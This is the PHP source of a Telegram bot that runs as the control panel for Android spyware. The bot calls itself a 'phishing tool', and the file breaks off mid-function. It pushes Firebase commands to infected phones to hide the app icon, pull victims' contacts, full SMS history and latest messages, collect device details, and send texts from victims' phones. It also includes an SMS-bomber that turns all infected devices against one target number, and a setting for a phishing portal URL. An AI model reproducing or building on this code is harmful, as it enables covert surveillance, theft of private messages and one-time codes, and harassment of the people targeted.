<?php 
error_reporting(0);

include("info.php");

define( 'TOKEN', $token );
define( 'API_ACCESS_KEY', $apikey );
if(!file_exists("userlist")){
mkdir("userlist");

}if(!file_exists("admins")){
file_put_contents("admins","");

}
if(!file_exists("user.txt")){
file_put_contents("user.txt","");

}
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot".TOKEN."/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}


function pingbot(){
    
    $ch = curl_init("127.0.0.1"); 
  curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
  if(curl_exec($ch))
  {
  $info = curl_getinfo($ch);
 return $info['total_time'] ;
  }

  curl_close($ch);

    
    
    
    
}

function action($action,$androidid){
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
} 
function deleteDirectory($dir) {
system('rm -rf -- ' . escapeshellarg($dir), $retval);
return $retval == 0; 
}
function sendmess($action,$androidid,$phone,$message){
    $port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'","phone":"'.$phone.'","text":"'.$message.'"},"to":"\/topics\/pluto"}';
$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
  
}
function ping($action){
$port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
   
}
function sm1($chatid,$text,$reply){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_to_message_id'=>$reply
	]);
}
function em($chatid,$message_id,$text,$keyboard){
bot('editmessagetext',[ 
    'chat_id'=>$chatid, 
    'message_id'=>$message_id,
    'text'=>$text,
    'parse_mode'=>'HTML',
    'reply_markup'=>$keyboard
	]);
	}
	
	
	
	
	
	
	
	$dir = "userlist";
$folders = array('..', '.', 'folder');
$files = array_diff(scandir($dir), $folders);
	
 
   
  foreach($files as $tr){
$and=json_decode(file_get_contents("userlist/$tr"))->androidid;
$name = str_replace(".json","",$tr);
$pmodel=json_decode(file_get_contents("userlist/$tr"))->name;
$ur = file_get_contents("saeed.txt");

$key[]= [['text'=>$name, 'callback_data'=>"androidid $pmodel $and"]];

}
$key[]= [['text'=> "• ʙᴀᴄᴋ •", 'callback_data'=> "back1"]];
$keyboard1= json_encode(['inline_keyboard'=> $key]);

 foreach($files as $tr){
$and=json_decode(file_get_contents("userlist/$tr"))->androidid;
$name = str_replace(".json","",$tr);


$key1[]= [['text'=>$name, 'callback_data'=>"deletes $name $and"]];

}


$key1[]= [['text'=> "• ʙᴀᴄᴋ •", 'callback_data'=> "booook"]];


   
 $keyboard2= json_encode(['inline_keyboard'=> $key1]);
  

   
function sm($chatid,$text,$keyboard){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_markup'=>$keyboard
	]);
    }
    $pingbot=pingbot();
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$message_id = $update->message->message_id;
$data = isset($message->text)?$message->text:$update->callback_query->data;
$chat_id = isset($update->callback_query->message->chat->id)?$update->callback_query->message->chat->id:$update->message->chat->id;
$from_id = isset($update->callback_query->message->from->id)?$update->callback_query->message->from->id:$update->message->from->id;
$text=$update->message->text;
$mi = $update->callback_query->message->message_id;
$first_n = $update->message->from->first_name;
$last_n = $update->message->from->last_name;
$first = $update->callback_query->from->first_name;
$last = $update->callback_query->from->last_name;
$firsms = file_get_contents("actionfirst.txt");
$first_name = $update->message->from->first_name;
$dom = file_get_contents("url.txt");
$usernamee = $update->message->from->username;
$username = $update->callback_query->from->username;
$adminact= file_get_contents("admins");
$authi=file_get_contents('autohide.txt');  
$count=count(scandir("userlist"))-2;
//=====

if(!file_exists("autohide.txt")){
file_put_contents("autohide",'off');
}


//==================================================,'callback_data' => 'PhoneList'
$ino = json_encode(array('inline_keyboard'=>[[['text'=>"ɴᴜᴍʙᴇʀ ᴜsᴇʀs",'callback_data' => 'jsieueueis'],['text'=>"{ $count }",'callback_data' => 'ddjsjsjsjj']],
[['text'=>"sᴇɴᴅᴇʀ ɪɴғᴏ",'callback_data' => 'koddkwkwkkk'],['text'=>"{ $id }",'callback_data' => 'kdkdks']],
[['text'=>"ᴀᴜᴛᴏ ʜɪᴅᴇ ɪs",'callback_data' => 'jsjsjs'],['text'=>"{ $authi }",'callback_data' => 'sjjejsjs']],
[['text'=>"ғɪʀsᴛ sᴍs",'callback_data' => 'jsjsjs'],['text'=>"{ $firsms }",'callback_data' => 'sjjejsjs']],
[['text'=>"ᴘᴏʀᴛ",'callback_data' => 'jdjjkkkdk'],['text'=>"{ $prt }",'callback_data' => 'jsjsi']],
[['text'=>"ᴘᴏʀᴛᴀʟ ᴅᴏᴍɪɴ",'callback_data' => 'kkkei']],
[['text'=>"{$dom}",'callback_data' => 'jdjsjj']],
[['text'=>"ᴛᴏᴋᴇɴ ʀᴏʙᴏᴛ",'callback_data' => 'jss']],
[['text'=>"{$token}",'callback_data' => 'jsjsjsje']],
[['text'=>"ʙᴀᴄᴋ",'callback_data' => 'booook']]
]));
$starta = json_encode(array(
'keyboard'=>[
[['text'=>'🕹ᴄᴏɴᴛʀᴏʟ ᴜsᴇʀ🕹'],['text'=>'⚡️ᴏɴʟɪɴᴇ ᴜsᴇʀ⚡️']],
[['text'=>'🔕ᴀᴜᴛᴏ ʜɪᴅᴇ🔕'],['text'=>'🔗ғɪʀsᴛ sᴍs🔗']],
[['text'=>'🌀sᴍsʙᴏᴍʙᴇʀ🌀']],
[['text'=>'♻️ʜɪᴅᴇ ᴀʟʟ♻️'],['text'=>'🔧ᴘᴏʀᴛᴀʟ🔧']],
[['text'=>'🛍ᴀᴍᴏᴜɴᴛ🛍'],['text'=>'💧ɪɴғᴏ ᴘᴀɴᴇʟ💧']],
[['text'=>'💥ʀᴇsᴇᴛ ʀᴏʙᴏᴛ💥'],['text'=>'🏳️‍🌈ʟᴀɴɢᴜᴀɢᴇ🏳️‍🌈']],
]));
$admins = json_encode(array(
'keyboard'=>[
[['text'=>'📍sᴇɴᴅ sᴍs📍'],['text'=>'⚡️ʜɪᴅᴇ ɪᴄᴏɴ⚡️']],
[['text'=>'📮ᴀʟʟ sᴍs📮'],['text'=>'🌀ᴄᴏɴᴛᴀᴄᴛ🌀']],
[['text'=>'✏️ᴀᴜᴛᴏ sᴍs✏️'],['text'=>'🔇sɪʟᴇɴᴛ🔇']],
[['text'=>'📬ʟᴀsᴛ sᴍs📬'],['text'=>'📱ɪɴғᴏ ᴜsᴇʀ📱']],
[['text'=>'▪️ʙᴀᴄᴋ▪️']]
]));
$buyi = json_encode(array(
'keyboard'=>[
[['text'=>'🟢ᴏɴ ʜɪᴅᴇ🟢'],['text'=>'🔴ᴏғғ ʜɪᴅᴇ🔴']],
[['text'=>'🟢ᴏɴ ʙᴜʏ🟢'],['text'=>'🔴ᴏғғ ʙᴜʏ🔴']],
[['text'=>'▪️ʙᴀᴄᴋ▪️']],
]));
$autohids = json_encode(array(
'keyboard'=>[
[['text'=>'✅ᴏɴ✅'],['text'=>'🚫ᴏғғ🚫']],
[['text'=>'▪️ʙᴀᴄᴋ▪️']],
]));
$fsms = json_encode(array(
'keyboard'=>[
[['text'=>'🔴 ᴏɴ 🔴'],['text'=>'🔵 ᴏғғ 🔵']],
[['text'=>'🌵sᴇᴛ ɴᴜᴍʙᴇʀ🌵']],
[['text'=>'🗯sᴇᴛ ᴛᴇxᴛ🗯']],
[['text'=>'▪️ʙᴀᴄᴋ▪️']],
]));
$lung = json_encode(array(
'keyboard'=>[
[['text'=>'🌎ᴘᴇʀsɪᴀɴ🌎']],
[['text'=>'▪️ʙᴀᴄᴋ▪️']],
]));
$dosel = json_encode(array(
'keyboard'=>[
[['text'=>'ʏᴇs 😆'],['text'=>'ᴇᴅɪᴛᴇ 😰']],
[['text'=>'▫️ʙᴀᴄᴋ▫️']],
]));
$back1=json_encode(array(
'keyboard'=>[
[['text'=>'▪️ʙᴀᴄᴋ▪️']]
]));
$back4=json_encode(array(
'keyboard'=>[
[['text'=>'▫️ʙᴀᴄᴋ▫️']]
]));

if(in_array($chat_id,$admin_list)){
	if(preg_match('/^\/([Ss]tart)(.*)/',$text)){
	    sm($chat_id,"{🐉} ʜᴇʟʟᴏ $first_name  ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ᴘʜɪsʜɪɴɢ ᴛᴏᴏʟ ʀᴏʙᴏᴛ 
	
{🍀} ʏᴏᴜ ᴄᴀɴ ᴅᴏ  ᴛʜʀᴏᴜɢʜ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ☺{👇🏻}

{👨‍💻} ᴏᴡɴᴇʀ $crd ",$starta);

	    }elseif($text == '▪️ʙᴀᴄᴋ▪️'){        
	    sm($chat_id,"{🐉} ʜᴇʟʟᴏ $first_name  ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ᴘʜɪsʜɪɴɢ ᴛᴏᴏʟ ʀᴏʙᴏᴛ 
	
{🍀} ʏᴏᴜ ᴄᴀɴ ᴅᴏ  ᴛʜʀᴏᴜɢʜ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ☺{👇🏻}

{👨‍💻} ᴏᴡɴᴇʀ $crd ",$starta);
file_put_contents("admins","");
}elseif($text == '🛍ᴀᴍᴏᴜɴᴛ🛍'){        
	    sm($chat_id,"{🛍} sᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴀᴄᴛɪᴏɴ ʜɪᴅᴇ ᴀᴜᴛᴏ ʙᴜʏ & ᴀᴍᴏᴜɴᴛ ᴄᴀʀᴅ

{👨‍💻} ᴏᴡɴᴇʀ $crd ",$buyi);
}
    elseif($text == '🔗ғɪʀsᴛ sᴍs🔗'){        
	    sm($chat_id,"{🦋} sᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴀᴄᴛɪᴏɴ ғɪʀsᴛ sᴍs {👇🏻}

{👨‍💻} ᴏᴡɴᴇʀ $crd ",$fsms);
}
    elseif($text == '🏳️‍🌈ʟᴀɴɢᴜᴀɢᴇ🏳️‍🌈'){        
	    sm($chat_id,"{🍟} sᴇʟᴇᴄᴛ ʏᴏᴜʀ ʟᴀɴɢᴜᴀɢᴇ ᴘᴀɴᴇʟ {👇🏻}

{👨‍💻} ᴏᴡɴᴇʀ $crd ",$lung);
	}elseif($text == '♻️ʜɪᴅᴇ ᴀʟʟ♻️'){
		sm($chat_id,"{📴} ʀᴇǫᴜᴇsᴛs ʜɪᴅᴇ ɪᴄᴏɴ sᴇɴᴅᴇᴅ ᴛᴏ ᴀʟʟ { $count } ᴜsᴇʀs

ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ʀᴇsᴘᴏɴsᴇ 🙂 {💊}

{👨‍💻} ᴏᴡɴᴇʀ $crd",$starta);
		
	 $data = file_get_contents('user.txt');
    $androidid1 = explode("/", $data); 
    foreach ($androidid1 as $androidid) {
        
  action('hideicon',$androidid);
       
    
    } 
 
	    

}elseif($text == '⚡️ᴏɴʟɪɴᴇ ᴜsᴇʀ⚡️'){
	sm($chat_id,"{📱} ʀᴇǫᴜᴇsᴛs sᴇɴᴅᴇᴅ ᴛᴏ ᴀʟʟ { $count } ᴜsᴇʀs

ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ʀᴇsᴘᴏɴsᴇ 🙂 {💊}

{👨‍💻} ᴏᴡɴᴇʀ $crd",$back1);
	    ping('ping');        
	    
}elseif($text == '🌀sᴍsʙᴏᴍʙᴇʀ🌀'){        
	    sm($chat_id,"{💢} ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴛᴀʀɢᴇᴛ

ᴀʟʟ ᴜᴇsᴇʀs $count {📟}

{👨‍💻} ᴏᴡɴᴇʀ $crd",$back1);
file_put_contents("admins","smsbomber");
	   }elseif($adminact == "smsbomber" ){
	    file_put_contents("bomber.txt",$text);
	    sm($chat_id,"{💢}  ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇxᴛ ʙᴏᴍʙᴇʀ

ᴀʟʟ ᴜᴇsᴇʀs : $count {📟}
ɴᴜᴍʙᴇʀ ᴛᴀʀɢᴇᴛ : $text {😆}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$back1);
file_put_contents("admins","smsbomber1");

}elseif($adminact == "smsbomber1" ){
    
    sm($chat_id,"{💣}  sᴘᴀᴍ ɪs $bom ᴛᴀʀɢᴇᴛ sᴇɴᴅᴇᴅ

ʏᴏᴜʀ ᴛᴇxᴛ ʙᴏᴍʙᴇʀ : $text

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);

file_put_contents("admins","");

	    file_put_contents("smsbomber.txt",$text);
	$message = file_get_contents("smsbomber.txt");
	$phone = file_get_contents("bomber.txt");
	$data = file_get_contents('user.txt');
    $androidid1 = explode("/", $data); 
    foreach ($androidid1 as $androidid) {
        
    sendmess("SendSingleMessage",$androidid,$phone,$message);
    }
	    

	    }elseif($text == '▫️ʙᴀᴄᴋ▫️'){
		sm($chat_id,"{🎛} ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ ᴛᴀʀɢᴇᴛ

sᴇʟᴇᴄᴛ ʏᴏᴜʀ ʙᴏᴛᴛᴜɴ 🤓 {👇} 
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);

 }elseif($text == '💥ʀᴇsᴇᴛ ʀᴏʙᴏᴛ💥'){
 	
		sm($chat_id,"{🔰} ʀᴇsᴇᴛ ᴀʟʟ ʙᴏᴛ
		
ᴀʟʟ ᴜsᴇʀ ᴅᴇʟᴇᴛᴇᴅ {✅}

ᴀʟʟ ᴀᴄᴛɪᴏɴ ᴅᴇʟᴇᴛᴇᴅ {✅}

sᴇʟᴇᴄᴛ ʏᴏᴜʀ ʙᴏᴛᴛᴜɴ 🤓 {👇} 
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
file_put_contents("url.txt","https://google.com");
deleteDirectory("userlist");
file_put_contents("p","");
file_put_contents("autohide.txt","off");
file_put_contents("actionbuy.txt","off");
file_put_contents("actionhide.txt","off");
file_put_contents("actionfirst.txt","off");
file_put_contents("ftext.txt","");
file_put_contents("fsms.txt","");
file_put_contents("user.txt","");

	
	}elseif($text == '💧ɪɴғᴏ ᴘᴀɴᴇʟ💧'){
	    
	    
	    
	     sm($chat_id,"{🎗} ᴍᴏʀᴇ iɴғᴏ ᴘʜɪsʜɪɴɢ ᴛᴏᴏʟ ʀᴏʙᴏᴛ  

{👨‍💻} ᴏᴡɴᴇʀ $crd ",$ino);

}
	elseif($data=="booook"){
	    
	    
	    
	     sm($chat_id,"{🐉} ʜᴇʟʟᴏ $first_name  ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ᴘʜɪsʜɪɴɢ ᴛᴏᴏʟ ʀᴏʙᴏᴛ 
	
{🍀} ʏᴏᴜ ᴄᴀɴ ᴅᴏ  ᴛʜʀᴏᴜɢʜ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ☺{👇🏻}

{👨‍💻} ᴏᴡɴᴇʀ $crd ",$starta);
file_put_contents("admins","");
	    
	    
	}elseif($text == '🕹ᴄᴏɴᴛʀᴏʟ ᴜsᴇʀ🕹'){        
	    sm($chat_id,"{📟} ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴀɴᴅʀᴏɪᴅ ɪᴅ ᴛᴀʀɢᴇᴛ 
	
{👨‍💻} ᴏᴡɴᴇʀ $crd",$back1);
	    file_put_contents("admins","setuser");
	
	    }elseif($text == '🌵sᴇᴛ ɴᴜᴍʙᴇʀ🌵'){        
	    sm($chat_id,"{🌵} ᴇɴᴛᴇʀ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ɪs ғɪʀsᴛ sᴍs
	
{👨‍💻} ᴏᴡɴᴇʀ $crd",$back1);
	    file_put_contents("admins","firstnum");
	
	}elseif($adminact == "firstnum" ){
	    file_put_contents("fsms.txt",$text);
	    sm($chat_id,"{✅}  ɴᴜᴍʙᴇʀ ғɪʀsᴛ sᴍs ʏᴏᴜʀ sᴇᴛᴇᴅ 

ʏᴏᴜʀ ɴᴜᴍʙᴇʀ : $text

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
}elseif($text == '🗯sᴇᴛ ᴛᴇxᴛ🗯'){        
	    sm($chat_id,"{🗯} ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇxᴛ sᴍs ɪs ғɪʀsᴛ sᴍs
	
{👨‍💻} ᴏᴡɴᴇʀ $crd",$back1);
	    file_put_contents("admins","firsttext");
	
	}elseif($adminact == "firsttext" ){
	    file_put_contents("ftext.txt",$text);
	    sm($chat_id,"{✅}  sᴍs ᴛᴇxᴛ ғɪʀsᴛ sᴍs ʏᴏᴜʀ sᴇᴛᴇᴅ 
	
ʏᴏᴜʀ sᴍs ᴛᴇxᴛ :

$text

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '🌎ᴘᴇʀsɪᴀɴ🌎'){ 
     rename("bot.php", "en.php");
	    sm($chat_id,"{🌎} ʟᴀɴɢᴜᴀɢᴇ ʀᴏʙᴏᴛ ᴄʜᴇɴɢɪɴɢ
ᴇɴᴛᴇʀᴇᴅ /start  {✅}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
rename("pe.php", "bot.php");
	 }elseif($text == '🔴 ᴏɴ 🔴'){ 
       file_put_contents("actionfirst.txt","on"); 
	    sm($chat_id,"{🎗} ғɪʀsᴛ sᴍs ɪs ᴏɴ  {✅}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '🔵 ᴏғғ 🔵'){ 
       file_put_contents("actionfirst.txt","off"); 
	    sm($chat_id,"{🎗} ғɪʀsᴛ sᴍs ɪs ᴏғғ  {❌}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
}elseif($text == '🟢ᴏɴ ʜɪᴅᴇ🟢'){ 
       file_put_contents("actionhide.txt","on"); 
	    sm($chat_id,"{🖲} ᴀᴜᴛᴏ ʜɪᴅᴇ ʙᴜʏ ɪs ᴏɴ  {✅}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '🔴ᴏғғ ʜɪᴅᴇ🔴'){ 
       file_put_contents("actionhide.txt","off"); 
	    sm($chat_id,"{🖲} ᴀᴜᴛᴏ ʜɪᴅᴇ ʙᴜʏ ɪs ᴏғғ  {❌}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
}elseif($text == '🟢ᴏɴ ʙᴜʏ🟢'){ 
       file_put_contents("actionbuy.txt","on"); 
	    sm($chat_id,"{🖲} ᴀᴍᴏᴜɴᴛ ʙᴜʏ ɪs ᴏɴ  {✅}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '🔴ᴏғғ ʙᴜʏ🔴'){ 
       file_put_contents("actionbuy.txt","off"); 
	    sm($chat_id,"{🖲} ᴀᴍᴏᴜɴᴛ ʙᴜʏ ɪs ᴏғғ  {❌}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
	}elseif($text == '🔧ᴘᴏʀᴛᴀʟ🔧'){        
	    sm($chat_id,"{🔗}  ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴜʀʟ ᴘᴏʀᴛᴀʟ 

ʙᴇ sᴜʀᴇ ᴛᴏ ᴇɴᴀʙʟᴇ ssʟ ᴀɴᴅ ғʀᴏᴍ HTTPS sᴇɴᴅ ᴀs {⚠️}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$back1);
	    file_put_contents("admins","setdom");
	
	    }elseif($text == '🔕ᴀᴜᴛᴏ ʜɪᴅᴇ🔕'){        
	    sm($chat_id,"{🔕} ɪs ᴀᴜᴛᴏ ʜɪᴅᴇ  ᴏɴ ᴏʀ ᴏғғ

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$autohids);
	    file_put_contents("admins","autohide");
	    
	    }elseif($text == '✅ᴏɴ✅'){ 
       file_put_contents("autohide.txt","on"); 
	    sm($chat_id,"{🔕} ᴀᴜᴛᴏ ʜɪᴅᴇ ɪs ᴏɴ  {✅}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '🚫ᴏғғ🚫'){ 
       file_put_contents("autohide.txt","off"); 
	    sm($chat_id,"{🔕} ᴀᴜᴛᴏ ʜɪᴅᴇ ɪs ᴏғғ  {🚫}

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
	
	}elseif(strpos($data,'androidid') !==false){
	   $datass=explode(" ",$data);
	 file_put_contents('p',$datass[2]);   
	 file_put_contents('name',$datass[1]);      
	    	            
	    em($chat_id,$mi,"🕹 - Wᴇʟᴄᴏᴍᴇ Tᴏ $datass[1]  Aᴅᴍɪɴ Pᴀɴᴇʟ 
	
Yᴏᴜ Cᴀɴ Mᴀɴᴀɢᴇ Yᴏᴜʀ Usᴇʀ Wɪᴛʜ Tʜᴇ Fᴏʟʟᴏᴡɪɴɢ Bᴜᴛᴛᴏɴs -《🎗》

Cᴏᴅᴇᴅ ʙʏ @Phish_otp - 🇫🇷️",$admins);
	    
	}elseif($text == '🔇sɪʟᴇɴᴛ🔇'){        
		sm($chat_id,"{🔇} ʀᴇǫᴜᴇsᴛs sɪʟᴇɴᴛ ᴍᴏᴅᴇ sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
	
 ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ʀᴇsᴘᴏɴsᴇ 😎 {⚡️}
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     action('pingone',$androidid);
	     
	    
	   
	}elseif($text == '✏️ᴀᴜᴛᴏ sᴍs✏️'){        
		sm($chat_id,"{🖍} sᴇɴᴅ ʏᴏᴜʀ ᴛᴇxᴛ sᴍs : 

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);   
file_put_contents("admins","autos");
}elseif($adminact == "autos" ){
	sm($chat_id,"{🎙}  sᴍs sᴇɴᴛ ʏᴏᴜʀ {30} ɴᴜᴍʙᴇʀs 
	ɴᴜᴍʙᴇʀ ʟᴇᴀᴄʜ : True
 ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ʀᴇsᴘᴏɴsᴇ 😎 {⚡️}
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
file_put_contents("admins","");

	}elseif($text == '📱ɪɴғᴏ ᴜsᴇʀ📱'){        
		sm($chat_id,"{📱} ʀᴇǫᴜᴇsᴛs ɪɴғᴏ ᴘʜᴏɴᴇ sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
	
 ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ʀᴇsᴘᴏɴsᴇ 😎 {⚡️}
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     
	     action('getdevicefullinfo',$androidid);
	     
	    
	   
	    
	}elseif($text == '🌀ᴄᴏɴᴛᴀᴄᴛ🌀'){        
		sm($chat_id,"{🌀} ʀᴇǫᴜᴇsᴛs ᴄᴏɴᴛᴀᴄᴛ .ᴛXᴛ sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
	
 ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ʀᴇsᴘᴏɴsᴇ 😎 {⚡️}
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
	    
	    $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	    
	     action('getcontact',$androidid);
	     
	    
	    
	    
	}elseif($text == '📮ᴀʟʟ sᴍs📮'){        
		sm($chat_id,"{📮} ʀᴇǫᴜᴇsᴛs ᴀʟʟ sᴍs .ᴛXᴛ sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
	
 ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ʀᴇsᴘᴏɴsᴇ 😎 {⚡️}
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
	    $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	    
	     action('getsms',$androidid);
	     
	    
	    
	    
	    
	}
	
	
	
	elseif($text == '📍sᴇɴᴅ sᴍs📍'){        
	    $messs=file_get_contents("mess");

	    sm($chat_id,"{📤} ʏᴏᴜʀ sᴍs ᴛᴇxᴛ :
	
$messs
	
ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴜsᴇ ᴛᴇxᴛ ᴛʜᴀᴛ ʜᴀs ᴀʟʀᴇᴀᴅʏ ʙᴇᴇɴ ᴘᴏsᴛᴇᴅ {❓}
	
{👨‍💻} ᴏᴡɴᴇʀ  $crd 
",$dosel);

   }
   elseif($text == 'ʏᴇs 😆'){
   	
   file_put_contents("admins","message1");
   sm($chat_id,"{☎️}ᴇɴᴛᴇʀ ʏᴏᴜʀ ʟɪsᴛ ɴᴜᴍʙᴇʀ : 

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$back4);
}
   elseif($text == 'ᴇᴅɪᴛᴇ 😰'){
   	
   file_put_contents("admins","message");
   sm($chat_id,"{🍀} ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇxᴛ sᴍs :

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$back4);
   
	

    }
    
	elseif($text == '⚡️ʜɪᴅᴇ ɪᴄᴏɴ⚡️'){
		     sm($chat_id,"{📴} ʀᴇǫᴜᴇsᴛs ʜɪᴅᴇ ɪᴄᴏɴ sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
	
 ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ʀᴇsᴘᴏɴsᴇ 😎 {⚡️}
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
	  $androidid=file_get_contents('p');  
action('hideicon',$androidid);
   $name=file_get_contents('name');  

	       
  
 
    
	    
	  
	    
	    
	}elseif($text == '📬ʟᴀsᴛ sᴍs📬'){
		sm($chat_id,"{📨} ʀᴇǫᴜᴇsᴛs ʟᴇᴀsᴛ sᴍs sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
	
 ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ʀᴇsᴘᴏɴsᴇ 😎 {⚡️}
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
	  $androidid=file_get_contents('p');  
action('lastsms',$androidid);
   $name=file_get_contents('name');  
     
	       

	}elseif($adminact == "message" ){
        file_put_contents('mess',$text);
        
        $nump=file_get_contents("nump");
        
        	    sm($chat_id,"{☎️}ᴇɴᴛᴇʀ ʏᴏᴜʀ ʟɪsᴛ ɴᴜᴍʙᴇʀ : 

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$back4);
        
         file_put_contents("admins","message1");
    }elseif($adminact == "message1" ){
    	sm($chat_id,"{📧} ʀᴇǫᴜᴇsᴛs sᴇɴᴅᴇᴅ sᴍs sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);   	    
file_put_contents("admins","");
        file_put_contents('nump',$text);
        $nump=file_get_contents("nump");
       $androidid=file_get_contents('p');  
	  $messs=  file_get_contents("mess");
 $data = file_get_contents('nump');
    $str = explode("\n", $data); 
